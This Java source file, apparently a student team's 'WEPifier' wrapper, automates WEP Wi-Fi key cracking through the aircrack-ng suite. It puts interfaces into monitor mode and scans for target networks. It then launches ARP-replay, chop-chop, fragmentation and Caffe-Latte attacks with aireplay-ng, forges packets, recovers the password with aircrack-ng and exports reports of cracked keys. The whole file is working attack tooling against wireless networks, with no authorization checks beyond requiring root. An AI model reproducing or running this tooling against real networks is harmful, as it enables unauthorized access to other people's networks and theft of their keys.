/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package main;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Scanner;

/**
 *
 * @author Team 8
 * Class meant to create a connection between the GUI and the main package
 * which is used for the communication with the aircrack-ng suite
 */
public class WEPConnection {
    private NetworkScanner ns;
    private int typeOfAttack=-1;
    private int index;
    private boolean macOK=false;
    public String[] getTargets(){return ns.getTargets();}
    /**
     * @param openProc Name of the process designed to run
     * @param param    Parameter for running the process
     * @param die      Should the process die or not
     * @param delay    time for delay in milliseconds for killing the application
     */
    private void openProcess(String openProc, String param, boolean die, int delay) {
        Thread t;
        /*
         * 1)setStopMode 2)setProcName 3)setParam 4)setRuntime 5)setPrintMode
         */
        if (die) {
            t = new Thread(new RunApplication(false, openProc, param, delay, false));
            t.start();
            if(delay>=0){
                try {
                    Thread.sleep(delay);
                } catch (InterruptedException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            }
        } else {
            RunApplication ra = new RunApplication(false, openProc, param, 0, true);
            ra.run();
        }

    }
    /**
     * Checks if Aircrack-ng suite is installed
     * @return true if aircrack is found
     */
    public boolean isAircrackInstalled()
    {
        File f = new File("/usr/bin/aircrack-ng");
        return f.exists();
    }
   /**
    * Will get the path where this application is running.
    * @return The path to write the file
    */
    public String getWritePath(){return ns.getFilePath();}
   /**
    * Will check if MAC entered by the user is valid.
    * @return true of entered MAC is valid
    */
    public boolean isManualMacUsable(){return macOK;}
    /**
     * Method is designed to check if a certain file exists or not.
     * @param file File which is checked for existence.
     * @return  true if file exists.
     */
    public boolean checkFileExists(File file)
    {
        return file.exists();
    }
    /**
     * Checks to see if the user is running the correct OS and is logged with
     * the correct credentials to run the application.
     * 
     * @return true if the user is running Linux and is root
     */
    public boolean isClearedToRun()
    {
        String check =System.getProperty("os.name");
        if(!check.equals("Linux")) return false;
        check = System.getProperty("user.name");
        if(!check.equals("root")) return false;
        if(!isAircrackInstalled()) return false;
        return true;
    }
    /**
     * 
     * @return Message whether the user is using the application on Linux and is root 
     */
    public String userSystemInfo()
    {
        if(isClearedToRun())
            return "User is running on "+System.getProperty("os.name")+" and is logged as "+
                    System.getProperty("user.name");
        else 
            return "User is not using Linux or is not logged in with the proper credentials.";
    }
    /**
     * Returns the monitor device name.
     * 
     * @param monitorName Monitor device name.
     */
    public String monitorDeviceName(){return ns.getMonitorDeviceName();}
    /**
     * Erase the scanning files if they are found. 
     * This method is important in order for the application not to read static text.
     */
    public void eraseFiles()
    {
        if(checkFileExists(new File("dump-01.kismet.csv")))
        {
            FileManagment fd = new FileManagment();
            FilterData fl = new FilterData();
            fd.eraseFiles(new File(fl.getLocalFolder(new File("dump-01.kismet.csv"))));
        }
    }
    /**
     * Get Key file for merging.
     * @return Path of file
     */
    public String getKey()
    {
            FileManagment fd = new FileManagment();
            FilterData fl = new FilterData();
            return fd.getPacketForMerge(new File(fl.getLocalFolder(new File("dump-01.kismet.csv"))));
    }
    /**
     * Will export a complete report into a CSV file.
     * 
     * @param index Location of target in the array
     * @return Message of success of failure
     */
    public String exportCSVData(int index)
    {
        FileWriter fl=null;
        DateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd");
        Date date = new Date();
        try{
            fl = new FileWriter(ns.getNameAt(index) +"-report.csv");
            fl.append("TargetName");
            fl.append(";");
            fl.append("TargetBSSID");
            fl.append(";");
            fl.append("Protection");
            fl.append(";");
            fl.append("DateOfCracking");
            fl.append(";");
            fl.append("TypeOfAttack"+";");
            fl.append("Password\n");
            fl.append(ns.getNameAt(index)+";");
            fl.append(ns.getIdAt(index)+";");
            fl.append(ns.getProtectionAt(index)+";");
            fl.append(dateFormat.format(date)+";");
            if(typeOfAttack==3) fl.append("ArpReplayAttack"+";");
            if(typeOfAttack==4) fl.append("Chop-Chop-Attack"+";");
            if(typeOfAttack==5) fl.append("FragmentationAttack"+";");
            if(typeOfAttack==6) fl.append("Caffe-Latte-Attack"+";");
            if(typeOfAttack==-1) fl.append("NoAttack"+";");
            fl.append(readPassword(index)+";");
            fl.flush();
            fl.close();
            typeOfAttack=-1;
            return "Report generated successfully!\n";
        } catch(IOException e)
        {
            return "Could not build report file.";
        }
    }
    /**
     * First phase of the process, also known as start phase, it is designed
     * to initialize the monitor mode and the scanner mode.
     * 
     * The class will check if existent log files exist and erase them if they do
     * in order to make room for the new batch.
     * 
     * Please note that that the kill time is set by default to 5 seconds.
     */
    public void firstPhase()
    {
        
        ns = new NetworkScanner();
        ns.setNetworkDevices();
        if((ns.getNumberOfMonitorDevices()-1)<0){
            startMonitor(ns.getNetworkDeviceName());
            ns.setNetworkDevices();
        }
        rescan(5000);
        try {
            Thread.sleep(1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
    /**
     * This method will read the password text file and print it to screen.
     * @param index Index number of the target in the array
     * @return The password if found.
     */
    public String readPassword(int index)
    {
        File f = new File(ns.getNameAt(index) +"-passwd.txt");
        String str="";
        try{
             Scanner scan = new Scanner(f);
             while(scan.hasNext())
            {
                 str+=scan.nextLine();
            }
             return str;
        } catch(IOException e)
        {
            return "No password found!";
        }
    }
    /**
     * Starts monitor mode.
     */
    public void startMonitor(String name)
    {
        String param = "start " + name; // param for invoking application
        openProcess("airmon-ng", param, false,0); // call to the invoke method
    }
    /**
     * @param chan Channel for generating the monitor device
     * 
     * Starts monitor mode.
     */
    public void startMonitor(int chan, String name)
    {
        //ns.setNetworkDevices();
        String param = "start " +name+" "+chan; // param for invoking application
        openProcess("airmon-ng", param, false,0); // call to the invoke method
    }
    /**
     * 
     * @param delay Time in milliseconds for killing the process.
     * 
     * 
     * First phase of the process, also known as start phase, it is designed
     * to initialize the monitor mode and the scanner mode.
     * 
     * The class will check if existent log files exist and erase them if they do
     * in order to make room for the new batch.
     * 
     * 
     */
    public void firstPhase(int delay)
    {
        FileManagment fd = new FileManagment();
        fd.eraseFiles(new File("dump-01.csv"));
        startMonitor(ns.getNetworkDeviceName());
        rescan(delay);
        ns = new NetworkScanner();
        try {
            Thread.sleep(1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
    /**
     * 
     * @param index Target on which sniffer is focused on
     * 
     * In this method the sniffer is called on a specific target.
     * 
     */
    public void secondPhase(int index)
    {
         this.index=index;
         ns.setTarget(index);
         ns.startSniffer();
    }
    /**
     * Will start the sniffer.
     */
    public void secondPhase()
    {
        ns.startSniffer();
    }
    /**
     * In this method the sniffer is called on a specific target.
     * @param mac Targets mac on which sniffer is focused on
     * 
     */
    public String setManualBSSID(String mac)
    {
        if(!checkCorrectMAC(mac))
            return "";
        mac = FilterData.filterMac(mac);
        int index = ns.searchByMAC(mac);
        if(index<0) 
            return "The target cannot be found!";
        ns.setTarget(index);
        macOK=true;
        return "";
        
    }
    /**
     * Will check if BSSID entered by user is correct.
     * @param mac BSSID of target
     * @return true if BSSID is correct
     */
    public boolean checkCorrectMAC(String mac)
    {
        if(mac.length()==17)
            return true;
        macOK=false;
        return false;
    }
    /*
     * Will merge Packets for attack methods. 
     */
    private void packetMerge()
    {
        String param = " -0 -a "+ns.getTarget()+" -h "+ns.getMAC()+" -k 255.255.255.255 -l 255.255.255.255 -y "+getKey()+" -w arp";
        openProcess("xterm -title Tester -bg black -fg red -e packetforge-ng ", param, false, -2);
    }
   /**
    * Returns target's name.
    * @param index Location of target in the array
    * @return Target name
    */
    public String getTarget(int index){return ns.getNameAt(index);}
    /**
     * Method will start the attack on the selected targets.
     * Depending on the parameter selected by the user, WEPifier will
     * launch the attack using predefined patterns.
     * @param attack The type of attack to be used
     */
    public void typeOfAttack(int attack)
    {
        typeOfAttack=attack;
         if (attack == 7) {
                attack = 9;
            }
            if (attack == 9) {
                String param = "-" + attack + " -b" + ns.getTarget() + " -h" + ns.getMAC() + " "+ns.getMonitorDeviceName();
                openProcess("xterm -title Tester -bg black -fg red -e aireplay-ng", param, false,-2);
            }
            if (attack != 9) {
                String param = " -" + "1 0" + " -a" + ns.getTarget() + " -h" + ns.getMAC() + " "+ns.getMonitorDeviceName();
                openProcess("xterm -title Auth -bg black -fg red -e aireplay-ng", param, false,-2);
                param = " -" + attack + " -b" + ns.getTarget() + " -h" + ns.getMAC() +" "+ns.getMonitorDeviceName();
                openProcess("xterm -title Attacker -bg black -fg red -e aireplay-ng", param, false,-2);
                if(attack>3 &&attack<6){
                    packetMerge();
                    param = " -2 -r arp mon0";
                 openProcess("xterm -title Aireplay -bg black -fg red -e aireplay-ng", param, false,-2);
                }
                
            }
    }
    /**
     * This will start the cracking procedure on a named target.
     * 
     * @param index  Number of the specified target
     */
     public void startCrack(int index)
    {
        ns.setTarget(index);
        String param=" -b "+ns.getTarget()+" -l "+ns.getNameAt(index) +"-passwd.txt "+ns.getFilePath()+"read-01.cap";
                openProcess("xterm -title Cracker -bg black -fg red -e aircrack-ng", param, false, 0);
    }
    /**
     * This will start the cracking process.
     */
    public void startCrack()
    {
        String param=" -b "+ns.getTarget()+" -l "+ns.getNameAt(index) +"-passwd.txt "+ns.getFilePath()+"read-01.cap";
                openProcess("xterm -title Cracker -bg black -fg red -e aircrack-ng", param, false, -2);
    }
    
    /**
     * This method will search through the avaliable monitor devices
     * and kill them if any are found.
     */
    public void stopMonitor()
    {
        ns.setNetworkDevices();
        int nr = ns.getNumberOfMonitorDevices();
        if(nr>=0)
            for(int i=0;i<nr;i++){
                String param = "stop" + " mon"+i; // param for invoking application
                openProcess("airmon-ng", param, false,0); // call to the invoke method
            }
        ns.resetMonitorDevice();
    }
    /**
     * This method will rescan the avaliable targets.
     * @param delay Time in milliseconds for killing the process.
     */
    public void rescan(int delay)
    {
        eraseFiles();
        String param = "-w dump "+ns.getMonitorDeviceName();
        openProcess("airodump-ng", param, true, delay);
        try {
            Thread.sleep(delay);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        ns.readNetworkInterfaces();
    }
   /**
     * This method will rescan the avaliable targets on specified channel.
     * @param delay Time in milliseconds for killing the process.
     * @param chan Channel for scanning.
     */
    public void rescan(int delay, int chan)
    {
        eraseFiles();
        String param = " -c "+chan+" -w dump "+ns.getMonitorDeviceName();
        openProcess("airodump-ng", param, true, delay);
        try {
            Thread.sleep(delay);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        ns.readNetworkInterfaces();
    }
}
